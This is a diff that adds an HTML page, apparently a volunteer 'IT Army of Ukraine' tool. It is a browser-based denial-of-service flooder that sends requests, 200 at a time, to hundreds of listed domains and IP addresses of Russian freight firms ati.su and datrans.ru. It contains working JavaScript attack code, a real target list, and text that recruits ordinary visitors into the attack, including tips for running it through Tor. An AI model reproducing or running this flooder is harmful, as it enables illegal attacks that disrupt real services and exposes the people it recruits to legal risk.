@@ -1,0 +1,722 @@
+<!doctype html><head>
+<html lang="en">
+<meta charset="utf-8">
+<meta name="viewport" content="width=1024">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<title>Day 341 flood</title>
+<link href="https://www.helpukr.xyz/bootstrap.helpukr.css" rel="stylesheet" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" crossorigin="anonymous"></script>
+<script src= "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+</head>
+
+
+<style>
+/* width */
+::-webkit-scrollbar {
+  width: 10px;
+  overflow: auto;
+  height: 0em;
+}
+/* Track */
+::-webkit-scrollbar-track {
+  background: #34a8eb;
+}
+/* Handle */
+::-webkit-scrollbar-thumb {
+  background: #63c6ff
+  ;
+}
+/* Handle on hover */
+::-webkit-scrollbar-thumb:hover {
+  background: yellow;
+}
+.style10 {
+	font-size: 9px;
+	color: #FFFFFF;
+}
+</style>
+	<script> 
+		/* This method uses ipify's api to get the clients IP Address. 
+		This method is completely free and no limitations of use. */ 
+		$.getJSON("https://api.ipify.org?format=json", 
+										function(data) { 
+			// userip element is where the IP will be displayed
+			$("#userip").html(data.ip); 
+		}) 
+	</script>
+	<style> 
+		h6 {
+		color:white;
+		}
+	</style>
+    <style>
+        body {
+            padding: 0;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #FFD600;
+        }
+        .title {
+            margin: 3rem auto 3rem auto;
+            text-align: center;
+            color: #005BBC;
+        }
+        .intro .howto {
+            background-color: #005BBC;
+        }
+        .intro .howto h3 {
+            color: #FFD600;
+            text-align: center;
+            margin-top: 1rem;
+        }
+        .intro .howto p {
+            color: white;
+            text-align: justify;
+        }
+
+        .footer {
+    color: #005BBC;
+    margin-top: 2rem;
+    text-align: center;
+        }
+        .desc{
+            color:black;
+            padding-top: 2rem;
+            padding-bottom: 2rem;
+            margin: 0 auto;
+            width: 60%;
+        }
+        .desc h3 {
+            text-align: center;
+            color: #005BBC;
+        }
+        #stats h4 {
+            font-size: 1.1em;
+            text-decoration: underline;
+            color: #005BBC;
+            font-weight: 400;
+        }
+        table.status {
+            margin-bottom: 10px;
+        }
+    .style1 {
+	color: #CC0000;
+	font-weight: bold;
+}
+.style6 {color: #FF6262}
+    .style7 {font-size: 0.1px}
+    .style9 {
+	color: #FFD600;
+	font-weight: bold;
+	font-size: 18px;
+}
+    .style10 {font-size: 24px}
+    .style11 {
+	font-size: 16px;
+	color: #FFFFFF;
+} 
+    .style13 {
+	margin: 3rem auto 3rem auto;
+	text-align: center;
+	color: #FFD600;
+	font-size: 24px;
+	font-weight: bold;
+}
+    .style14 {color: #FFFFFF}
+    .style15 {color: #FFFF00}
+    .style16 {color: #FF3300}
+    .style17 {color: #FF6633}
+.style21 {color: #B9DCFF}
+    .style22 {color: #ECE3AA}
+	table {
+  border-color: #fffd9c;
+}
+</style>
+<body>
+    <div class="modal" id="HelpUKR-WarningBox" tabindex="-1" role="dialog" aria-labelledby="HelpUKR-WarningBoxLabel" aria-hidden="true" data-bs-backdrop="static" data-bs-keyboard="false">
+    <div class="modal-dialog modal-dialog-centered" role="document">
+    <div class="modal-content">
+    <div class="modal-header" style=" padding-bottom: 4px; padding-top: 3px;padding-left: 3px;">
+    <h5 id="HelpUKR-WarningBoxLabel" style=" margin-bottom: 0px;">
+	<span class="modal-title style1"><img class="qIBnUc" src="https://i.imgur.com/hwWmsDc.png" draggable="false" width="50px" alt="UKR"> Warning: </span><span class="modal-title style6">Read before you continue.&nbsp;<span class="style16"><i>[</span><span class="style17"><b>Day 341</span></b><span class="style16">]</i></span></span></h5></div>
+    <div class="modal-body" style=" padding-top: 5px; padding-bottom: 0px;">
+    <p style=" margin-bottom: 0px;">As you’ll already be aware, DDoSin or participating in any kind of cyber-attack in general is illegal, and usually for good reason.</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p style=" margin-bottom: 0px;">Click "Continue" if you have a VPN, Proxy, the Tor browser or  your own secure connection &amp; wish to support Ukraine in taking down Russian propaganda and services aiding Putins invasion</p>
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+		This works by sending GET requests to each targeted website. It’s like opening each website in a random sequence on your PC and re-requesting the data over and over, although the data is not saved or cached, Due to the way it work, It should be fair to say that your Internet service Provider (ISP) won’t be any more bothered about this than they would you browsing the internet, but its always best to stay safe when it comes to security.                                                                                                                                                                                                                                                           
+<hr style=" margin-top: 3px; margin-bottom: 3px;">
+    <p><span style="font-size:14px;"><u></u><strong>Message from the IT Army of Ukraine regarding Todays targets: </strong></span>&nbsp;<br>
+  &nbsp; &nbsp; &nbsp; Well done! We continue to paralyze their logistics and add<br>
+  &nbsp; &nbsp; &nbsp; a new resource — Da-Trans<br><span style="font-size:14px;"><u></u><strong>Additional message for newly added targets: <em>(Previous)</em>&nbsp;</strong></span>&nbsp;<br>
+  &nbsp;&nbsp;After powerful attacks on all major players of the russian OFD&nbsp;<br>
+  &nbsp;&nbsp;market, we suggest moving on to the topic  of freight&nbsp;<br>
+  &nbsp;&nbsp;transportation. ATI.SU (reight transportation exchange) is&nbsp;<br>
+  &nbsp;&nbsp;honored to open our working week.&nbsp;<br>
+    </p>
+    </p>
+    </div>
+    <div class="modal-footer">
+    <button type="button" class="btn btn-secondary" onClick="window.location.href='https://www.helpukr.xyz'">Leave</button>
+    <button type="button" class="btn btn-primary" data-dismiss="HelpUKR-WarningBoxLabel" onClick="togglePause(); myModal.toggle();">Continue</button></div></div></div></div>
+    <table width="100%" border="0" align="center" bgcolor="#005BBC">
+      <tr>
+        <td bgcolor="#004A9D"><div align="center">
+          <table width="200" border="1" style="border-top-width: 0px;">
+              <tbody><tr>
+                <td><table width="989" border="1" align="left" style="border-top-width: 0px;border-bottom-width: 0px;border-left-width: 0px;border-right-width: 0px;">
+                  <tbody>
+                    <tr>
+                      <td width="239" bgcolor="#005BB7"><div align="right"><span class="style14"><strong> Info:</strong> Your Public IP Address is: </span></div></td>
+                      <td width="175" bgcolor="#005BB7"><h6 id="userip" style="margin-bottom: 0px;">Loading..</h6></td>
+                      <td width="553" bgcolor="#005BB7"><div align="right"><span class="style21">For privacy, download the Tor Browser:</span> <a href="https://www.torproject.org/download/" target="_blank" class="style22" rel="nofollow">https://www.torproject.org/download/</a> &nbsp; </div></td>
+                    </tr>
+                  </tbody>
+                </table></td>
+              </tr>
+            </tbody></table>
+          <p class="style13" style="margin-top: 0px;margin-bottom: 0px;">Propaganda http(s) flood for <span class="style15">Day 341 </span>using targets from the IT Army of Ukraine.</p>
+        </div></td>
+      </tr><tr>
+        <td bgcolor="#0057B7"><div align="center" class="style9 style10">
+          <h3><u>Information about this tool.</u></h3>
+        </div></td>
+      </tr><tr>
+        <td><table width="90%" border="0" align="center">
+          <tr>
+            <td align="center"><p class="style11">This tool is hosted via <a href="https://pages.github.com/" target="_blank" class="align-content-sm-between">GitHub Page</a>, You can download it for local use and customization <a href="https://raw.githubusercontent.com/helpukr/helpukr.github.io/main/day341.htm" target="_blank" class="style15">here</a>. A new page will be added for each day, with a new set of targets from the Ukrainian IT Army's telegram servers.</p>
+              <p class="style11">All of the news in the Russian federation is fake and need to be shut down, we need as many people as possible to help. Just a tiny 1kbps of data could be the edge needed to take down a server hosting propaganda.<br>
+                <br>Just open this page and leave it running on your devices as long as possible, it will flood targets selected specifically for that day.<br>
+                Targets are chosen by an intelligence team who are always looking at what services are aiding Russia’s war,together we can pose a huge load on their infrastructure.</p>
+          <details>
+			  <summary><span style="color: #ffff99;">Click Here for <b>FAQ</b> <i>(Questions & Answers)</i></span></summary>
+              <p><table width="100%" border="0">
+                <tbody><tr>   
+                  <td><hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"><p class="style11">FAQ:<br>
+                    <span style="color: #ffff99;"><strong>Q)</strong></span> How can I use this in the tor browser if HTTPS overrides HTTP no matter what i try?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> <em>Download the page for local use, it won't use any http/https protocols because those are used to request files from a web server, but using it locally (directly from your computer) bypasses the need and allows you to flood both HTTP and HTTPS from your TOR Browser's IP.</em></p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> How can I see what's happening in more detail?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> After so much time has passed, my browser/computer become very laggy and unresponsive or my browser crashes, how can I fix this?<br>
+                    <span style="color: #ffff99;"><strong>A)</strong></span> Redacted for security.</p>
+                    <p class="style11"><span style="color: #ffff99;"><strong>Q)</strong></span> Why are some of the requests having the same number error after a while?<br>
+                      <span style="color: #ffff99;"><strong>A)</strong></span> This is likely caused by the IP of the VPN you're using has been blocked on their side, but it could also mean the site's just totally overloaded and cannot respond to any requests.<br>Also if you’re are using https:// in the address bar that would cause the http:// addresses to do the same</p></td>
+                    </tr>
+                </tbody>
+            </table></p>
+          </details>
+            <hr style=" margin-top: 5px; margin-bottom: 5px; color: #FFFFFF"></td>
+          </tr>
+        </table>
+          <table width="613" border="0" align="center">
+            <tr>
+              <td width="607"><h3 align="center" class="style14">Session Status</h3>
+                <p align="center" class="style14" style=" margin-bottom: 0px; padding-bottom: 2px;">Below is a log of sites that ether responded with errors or failed to respond at all.<br>
+                  It’s normal for this number to count up slow or fast and can often change.<br>
+                  If a lot of services are overloaded the numbers will go fast, else they’ll go slower.<br>
+                  If all requests are the same as all errors on some sites, it most likely means that the<br>
+                  site operator has banned the IP you’re using.</p>
+              </td>
+            </tr>
+          </table>
+	    </td>
+      </tr>
+    </table>
+<div class="desc text-center" style=" padding-top: 4px;">
+  <p align="center" class="style7" style=" margin-bottom: 0px;">Total number of requests: <span id="totalrequests">0</span></p>
+  <p>So far <span id="totalerrors"><em>zero</em></span> sites have responded with errors</p>
+<button type="button" class="btn btn-primary" onClick="togglePause();" style=" padding-left: 32px; padding-right: 32px; padding-top: 8px; padding-bottom: 8px;">Resume</button></div>
+<div id="stats" class="container">
+  <div class="row">
+  </div>
+</div>
+<p class="footer">This website is an easy to run solution to flooding Russian propaganda via any internet capable device with a browser.<br>
+      For example you can walk around town shopping and flood Russian propaganda from a phone in your pocket.<br>
+      It can even be used via the browser app on a Smart TV in the background whilst you watch TV.<br>
+      With your help you can convince a Russian to rebel agents the war by making them<br>
+      look elsewhere for news, remember, Nothing you do is too little!<br>
+      Glory to Ukraine, Glory to the hero’s.<br><br>
+	  <center>
+	    <div id="betabox" style="text-align: center"><span class="footer"><strong><span style="color:#3E7EFF"><em><u>Beta</u>:</em></span></strong> Estimated data requested from servers via GET: <span class="number-counter" data-count-from="0" data-count-to="1000000000000" data-count-speed="0.02">0</span>MB (MegaBytes)</span></div></center>
+<style>#betabox {
+  padding: 1px ;
+  border-top: 1px solid #3498db;
+  border-right: 1px solid #3498db;
+  background-color: #FFE248;
+  line-height: 110%;
+  border-left: 1px solid #3498db;
+  align-content: center;
+  align-self: 4px ;
+  width: 570px ;
+}</style>
+<script>
+        // target list
+        var urls = [
+        //After powerful attacks on all major players of the russian OFD market, we suggest moving on to the topic of freight transportation. ATI.SU (reight transportation exchange) is honored to open our working week
+        //ATI Targets
+		    'http://mx30.ati.su',
+		    'http://139.45.234.120',
+		    'http://mx40.ati.su',
+		    'http://139.45.234.124',
+		    'http://mx32.ati.su',
+		    'http://139.45.252.32',
+		    'http://mx20.ati.su',
+		    'http://139.45.252.30',
+		    'http://ati.su',
+		    'http://139.45.234.81',
+		    'http://mx20.ati.su',
+		    'http://139.45.252.30',
+		    'http://mx30.ati.su',
+		    'http://139.45.234.120',
+		    'http://r1.ati.su',
+		    'http://mx32.ati.su',
+		    'http://139.45.252.32',
+		    'http://btimp24.ati.su',
+		    'http://94.140.196.52',
+		    'http://userdata.ati.su',
+		    'http://job.ati.su',
+		    'http://139.45.252.60',
+		    'http://mx.job.ati.su',
+		    'http://139.45.234.71',
+		    'http://d.ati.su',
+		    'http://139.45.252.60',
+		    'http://id.ati.su',
+		    'http://trace.ati.su',
+		    'http://139.45.252.52',
+		    'http://billing.ati.su',
+		    'http://139.45.252.58',
+		    'http://api.ati.su',
+		    'http://139.45.252.52',
+		    'http://tm.ati.su',
+		    'http://139.45.252.56',
+		    'http://zen.ati.su',
+		    'http://139.45.252.52',
+		    'http://help.ati.su',
+		    'http://faq.ati.su',
+		    'http://loads.ati.su',
+		    'http://files.ati.su',
+		    'http://spb.files.ati.su',
+		    'http://139.45.252.24',
+		    'http://trucks.ati.su',
+		    'http://firms.ati.su',
+		    'http://forums.ati.su',
+		    'http://tenders.ati.su',
+		    'http://news.ati.su',
+		    'http://chat.ati.su',
+		    'http://139.45.252.12',
+		    'http://about.ati.su',
+		    'http://139.45.252.24',
+		    'http://adv.ati.su',
+		    'http://139.45.252.22',
+		    'http://www.ati.su',
+		    'http://139.45.252.52',
+		    'https://mx30.ati.su',
+		    'https://139.45.234.120',
+		    'https://mx40.ati.su',
+		    'https://139.45.234.124',
+		    'https://mx32.ati.su',
+		    'https://139.45.252.32',
+		    'https://mx20.ati.su',
+		    'https://139.45.252.30',
+		    'https://ati.su',
+		    'https://139.45.234.81',
+		    'https://mx20.ati.su',
+		    'https://139.45.252.30',
+		    'https://mx30.ati.su',
+		    'https://139.45.234.120',
+		    'https://r1.ati.su',
+		    'https://mx32.ati.su',
+		    'https://139.45.252.32',
+		    'https://btimp24.ati.su',
+		    'https://94.140.196.52',
+		    'https://userdata.ati.su',
+		    'https://job.ati.su',
+		    'https://139.45.252.60',
+		    'https://mx.job.ati.su',
+		    'https://139.45.234.71',
+		    'https://d.ati.su',
+		    'https://139.45.252.60',
+		    'https://id.ati.su',
+		    'https://trace.ati.su',
+		    'https://139.45.252.52',
+		    'https://billing.ati.su',
+		    'https://139.45.252.58',
+		    'https://api.ati.su',
+		    'https://139.45.252.52',
+		    'https://tm.ati.su',
+		    'https://139.45.252.56',
+		    'https://zen.ati.su',
+		    'https://139.45.252.52',
+		    'https://help.ati.su',
+		    'https://faq.ati.su',
+		    'https://loads.ati.su',
+		    'https://files.ati.su',
+		    'https://spb.files.ati.su',
+		    'https://139.45.252.24',
+		    'https://trucks.ati.su',
+		    'https://firms.ati.su',
+		    'https://forums.ati.su',
+		    'https://tenders.ati.su',
+		    'https://news.ati.su',
+		    'https://chat.ati.su',
+		    'https://139.45.252.12',
+		    'https://about.ati.su',
+		    'https://139.45.252.24',
+		    'https://adv.ati.su',
+		    'https://139.45.252.22',
+		    'https://www.ati.su',
+		    'https://139.45.252.52',
+        //DaTrans Targets
+		    'http://datrans.ru',
+		    'http://kaluga.datrans.ru',
+		    'http://77.244.208.187',
+		    'http://46.148.239.115',
+		    'http://77.244.208.186',
+		    'http://77.244.208.189',
+		    'http://188.235.136.248',
+		    'http://77.244.208.188',
+		    'http://krasnoyarsk.datrans.ru',
+		    'http://www.datrans.ru',
+		    'http://cheljabinsk.datrans.ru',
+		    'http://voronezh.datrans.ru',
+		    'http://tula.datrans.ru',
+		    'http://arhangelsk.datrans.ru',
+		    'http://angarsk.datrans.ru',
+		    'http://dzerzhinsk.datrans.ru',
+		    'http://kislovodsk.datrans.ru',
+		    'http://orenburg.datrans.ru',
+		    'http://sankt-peterburg.datrans.ru',
+		    'http://b24.datrans.ru',
+		    'http://blagoveschensk.datrans.ru',
+		    'http://naro-fominsk.datrans.ru',
+		    'http://sochi.datrans.ru',
+		    'http://chita.datrans.ru',
+		    'http://krymsk.datrans.ru',
+		    'http://achinsk.datrans.ru',
+		    'http://kerch.datrans.ru',
+		    'http://noginsk.datrans.ru',
+		    'http://lk.datrans.ru',
+		    'http://vorkuta.datrans.ru',
+		    'http://obninsk.datrans.ru',
+		    'http://volgodonsk.datrans.ru',
+		    'http://vladivostok.datrans.ru',
+		    'http://penza.datrans.ru',
+		    'http://mytischi.datrans.ru',
+		    'http://tuapse.datrans.ru',
+		    'http://data1c.datrans.ru',
+		    'http://novouralsk.datrans.ru',
+		    'http://uhta.datrans.ru',
+		    'http://www.data1c.datrans.ru',
+		    'http://kostroma.datrans.ru',
+		    'http://petrozavodsk.datrans.ru',
+		    'http://mahachkala.datrans.ru',
+		    'http://cherepovec.datrans.ru',
+		    'http://moodle.datrans.ru',
+		    'http://kolomna.datrans.ru',
+		    'http://ulan-ude.datrans.ru',
+		    'http://himki.datrans.ru',
+		    'http://voskresensk.datrans.ru',
+		    'http://volgograd.datrans.ru',
+		    'http://nahodka.datrans.ru',
+		    'http://yalta.datrans.ru',
+		    'http://vologda.datrans.ru',
+		    'http://salehard.datrans.ru',
+		    'http://kaliningrad.datrans.ru',
+		    'http://belgorod.datrans.ru',
+		    'http://saransk.datrans.ru',
+		    'http://bryansk.datrans.ru',
+		    'http://komsomolsk-na-amure.datrans.ru',
+		    'http://nizhnekamsk.datrans.ru',
+		    'http://novokuzneck.datrans.ru',
+		    'http://murmansk.datrans.ru',
+		    'http://noyabrsk.datrans.ru',
+		    'http://dimitrovgrad.datrans.ru',
+		    'http://anapa.datrans.ru',
+		    'http://velikiy-novgorod.datrans.ru',
+		    'http://automatic.datrans.ru',
+		    'http://tolyatti.datrans.ru',
+		    'http://apidoc.datrans.ru',
+		    'http://taganrog.datrans.ru',
+		    'http://novosib.datrans.ru',
+		    'http://solikamsk.datrans.ru',
+		    'http://lipeck.datrans.ru',
+		    'http://berdsk.datrans.ru',
+		    'http://ivanteevka.datrans.ru',
+		    'http://srv1.datrans.ru',
+		    'http://chelyabinsk.datrans.ru',
+		    'http://omsk.datrans.ru',
+		    'http://smolensk.datrans.ru',
+		    'http://tobolsk.datrans.ru',
+		    'http://aspro.datrans.ru',
+		    'http://vyksa.datrans.ru',
+		    'http://lensk.datrans.ru',
+		    'http://1c.datrans.ru',
+		    'http://ekaterinburg.datrans.ru',
+		    'http://eshkar-ola.datrans.ru',
+		    'http://spytnik.datrans.ru',
+		    'http://krasnokamensk.datrans.ru',
+		    'http://pervouralsk.datrans.ru',
+		    'http://tomsk.datrans.ru',
+		    'http://severodvinsk.datrans.ru',
+		    'http://samara.datrans.ru',
+		    'http://vidnoe.datrans.ru',
+		    'http://neftekamsk.datrans.ru',
+		    'http://ng.datrans.ru',
+		    'http://lesosibirsk.datrans.ru',
+		    'http://zelenodolsk.datrans.ru',
+		    'http://spb.datrans.ru',
+		    'http://nizhniy-novgorod.datrans.ru',
+		    'http://podolsk.datrans.ru',
+		    'http://troick.datrans.ru',
+		    'http://elista.datrans.ru',
+		    'http://yuzhno-sahalinsk.datrans.ru',
+		    'http://sterlitamak.datrans.ru',
+		    'http://calc.datrans.ru',
+		    'http://ufa.datrans.ru',
+		    'https://datrans.ru',
+		    'https://kaluga.datrans.ru',
+		    'https://77.244.208.187',
+		    'https://46.148.239.115',
+		    'https://77.244.208.186',
+		    'https://77.244.208.189',
+		    'https://188.235.136.248',
+		    'https://77.244.208.188',
+		    'https://krasnoyarsk.datrans.ru',
+		    'https://www.datrans.ru',
+		    'https://cheljabinsk.datrans.ru',
+		    'https://voronezh.datrans.ru',
+		    'https://tula.datrans.ru',
+		    'https://arhangelsk.datrans.ru',
+		    'https://angarsk.datrans.ru',
+		    'https://dzerzhinsk.datrans.ru',
+		    'https://kislovodsk.datrans.ru',
+		    'https://orenburg.datrans.ru',
+		    'https://sankt-peterburg.datrans.ru',
+		    'https://b24.datrans.ru',
+		    'https://blagoveschensk.datrans.ru',
+		    'https://naro-fominsk.datrans.ru',
+		    'https://sochi.datrans.ru',
+		    'https://chita.datrans.ru',
+		    'https://krymsk.datrans.ru',
+		    'https://achinsk.datrans.ru',
+		    'https://kerch.datrans.ru',
+		    'https://noginsk.datrans.ru',
+		    'https://lk.datrans.ru',
+		    'https://vorkuta.datrans.ru',
+		    'https://obninsk.datrans.ru',
+		    'https://volgodonsk.datrans.ru',
+		    'https://vladivostok.datrans.ru',
+		    'https://penza.datrans.ru',
+		    'https://mytischi.datrans.ru',
+		    'https://tuapse.datrans.ru',
+		    'https://data1c.datrans.ru',
+		    'https://novouralsk.datrans.ru',
+		    'https://uhta.datrans.ru',
+		    'https://www.data1c.datrans.ru',
+		    'https://kostroma.datrans.ru',
+		    'https://petrozavodsk.datrans.ru',
+		    'https://mahachkala.datrans.ru',
+		    'https://cherepovec.datrans.ru',
+		    'https://moodle.datrans.ru',
+		    'https://kolomna.datrans.ru',
+		    'https://ulan-ude.datrans.ru',
+		    'https://himki.datrans.ru',
+		    'https://voskresensk.datrans.ru',
+		    'https://volgograd.datrans.ru',
+		    'https://nahodka.datrans.ru',
+		    'https://yalta.datrans.ru',
+		    'https://vologda.datrans.ru',
+		    'https://salehard.datrans.ru',
+		    'https://kaliningrad.datrans.ru',
+		    'https://belgorod.datrans.ru',
+		    'https://saransk.datrans.ru',
+		    'https://bryansk.datrans.ru',
+		    'https://komsomolsk-na-amure.datrans.ru',
+		    'https://nizhnekamsk.datrans.ru',
+		    'https://novokuzneck.datrans.ru',
+		    'https://murmansk.datrans.ru',
+		    'https://noyabrsk.datrans.ru',
+		    'https://dimitrovgrad.datrans.ru',
+		    'https://anapa.datrans.ru',
+		    'https://velikiy-novgorod.datrans.ru',
+		    'https://automatic.datrans.ru',
+		    'https://tolyatti.datrans.ru',
+		    'https://apidoc.datrans.ru',
+		    'https://taganrog.datrans.ru',
+		    'https://novosib.datrans.ru',
+		    'https://solikamsk.datrans.ru',
+		    'https://lipeck.datrans.ru',
+		    'https://berdsk.datrans.ru',
+		    'https://ivanteevka.datrans.ru',
+		    'https://srv1.datrans.ru',
+		    'https://chelyabinsk.datrans.ru',
+		    'https://omsk.datrans.ru',
+		    'https://smolensk.datrans.ru',
+		    'https://tobolsk.datrans.ru',
+		    'https://aspro.datrans.ru',
+		    'https://vyksa.datrans.ru',
+		    'https://lensk.datrans.ru',
+		    'https://1c.datrans.ru',
+		    'https://ekaterinburg.datrans.ru',
+		    'https://eshkar-ola.datrans.ru',
+		    'https://spytnik.datrans.ru',
+		    'https://krasnokamensk.datrans.ru',
+		    'https://pervouralsk.datrans.ru',
+		    'https://tomsk.datrans.ru',
+		    'https://severodvinsk.datrans.ru',
+		    'https://samara.datrans.ru',
+		    'https://vidnoe.datrans.ru',
+		    'https://neftekamsk.datrans.ru',
+		    'https://ng.datrans.ru',
+		    'https://lesosibirsk.datrans.ru',
+		    'https://zelenodolsk.datrans.ru',
+		    'https://spb.datrans.ru',
+		    'https://nizhniy-novgorod.datrans.ru',
+		    'https://podolsk.datrans.ru',
+		    'https://troick.datrans.ru',
+		    'https://elista.datrans.ru',
+		    'https://yuzhno-sahalinsk.datrans.ru',
+		    'https://sterlitamak.datrans.ru',
+		    'https://calc.datrans.ru',
+		    'https://ufa.datrans.ru',
+        ];
+        // initialize variables
+        var targets = urls.reduce((o, key) => ({ ...o, [key]: {number_of_requests: 0, number_of_errored_responses: 0}}), {})
+        var statRow = document.querySelector("#stats > .row");
+        var myModal = new bootstrap.Modal(document.getElementById('HelpUKR-WarningBox'), {});
+        var CONCURRENCY_LIMIT = 200;
+        var queue = [];
+        var attack = false;
+        var totalrequests = 0;
+        var totalerrors = 0;
+        function togglePause () {
+            if (attack) {
+                attack = false;
+                document.querySelector("div.desc .btn").innerText = "Resume";
+            } else {
+                attack = true;
+                document.querySelector("div.desc .btn").innerText = "Pause";
+                for (var i=0; i<urls.length; i++) {
+                    flood(i);
+                }
+            }
+        }
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                signal: controller.signal,
+                mode: 'no-cors'
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        async function sleep(ms) {
+            return new Promise(r => setTimeout(r, ms));
+        }         
+        async function flood(n) {
+            const url = urls[n];
+            const target = targets[url];
+            while (attack) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift();
+                }
+                queue.push(
+                    fetchWithTimeout(url, { timeout: 2000 })
+                        .catch((error) => {
+                            if (error.code === 20 /* ABORT */) {
+                                return;
+                            }
+                            target.number_of_errored_responses++;
+                            target.error_message = error.message;
+                            totalerrors++;
+                        })
+                        .then((response) => {
+                            if (response && !response.ok) {
+                                target.number_of_errored_responses++;
+                                target.error_message = response.statusText;
+                                totalerrors++;
+                            }
+                            target.number_of_requests++;
+                        })
+                        .finally(() => updateTargetDisplay(n))
+                );
+                await sleep(1);
+            }
+        }
+        // Update data for target n
+        function updateTargetDisplay(n) {
+            var url = urls[n];
+            var {number_of_requests, number_of_errored_responses} = targets[url];
+            var requests_cell = document.querySelector(`#target${n} .requests`);
+            var errors_cell = document.querySelector(`#target${n} .errors`);
+            requests_cell.innerText = number_of_requests;
+            errors_cell.innerText = number_of_errored_responses;
+            document.querySelector("#totalrequests").innerText = totalrequests;
+            document.querySelector("#totalerrors").innerText = totalerrors;
+        }
+        // Shuffle array order before starting
+        for (let i = urls.length - 1; i > 0; i--) {
+            const j = Math.floor(Math.random() * (i + 1));
+            [urls[i], urls[j]] = [urls[j], urls[i]];
+        }
+        // Create div for each target
+        for (var i=0; i<urls.length; i++) {
+            statRow.innerHTML += `
+                <div class="col-lg-3 col-md-4 col-sm-6" id="target${i}">
+                  <h7>${"<u><i>Hidden Target:</i></u>"}</h7>
+                    <table class='status'>
+                      <tr><td>requests:</td><td class="requests">0</td></tr>
+                      </tr><td>errors:</td><td class="errors">0</td></tr>
+                    </table>
+                  </div>
+            `;
+        }
+        // Show warning window
+        myModal.toggle();
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'UA-85513613-1');
+</script>
+<script>
+// BETA plugin for estimated requested data
+(function($) {
+  $.fn.countTo = function(options) {
+    return this.each(function() {
+      //-- Arrange
+      var FRAME_RATE = 60; // Predefine default frame rate to be 60fps
+      var $el = $(this);
+      var countFrom = parseInt($el.attr('data-count-from'));
+      var countTo = parseInt($el.attr('data-count-to'));
+      var countSpeed = $el.attr('data-count-speed'); // Number increment per second
+
+      //-- Action
+      var rafId;
+      var increment;
+      var currentCount = countFrom;
+      var countAction = function() {              // Self looping local function via requestAnimationFrame
+        if(currentCount < countTo) {              // Perform number incremeant
+          $el.text(Math.floor(currentCount));     // Update HTML display
+          increment = countSpeed / FRAME_RATE;    // Calculate increment step
+          currentCount += increment;              // Increment counter
+          rafId = requestAnimationFrame(countAction);
+        } else {                                  // Terminate animation once it reaches the target count number
+          $el.text(countTo);                      // Set to the final value before everything stops
+          //cancelAnimationFrame(rafId);
+        }
+      };
+      rafId = requestAnimationFrame(countAction); // Initiates the looping function
+    });
+  };
+}(jQuery));
+
+//-- Executing
+$('.number-counter').countTo();
+</script>
+</html>
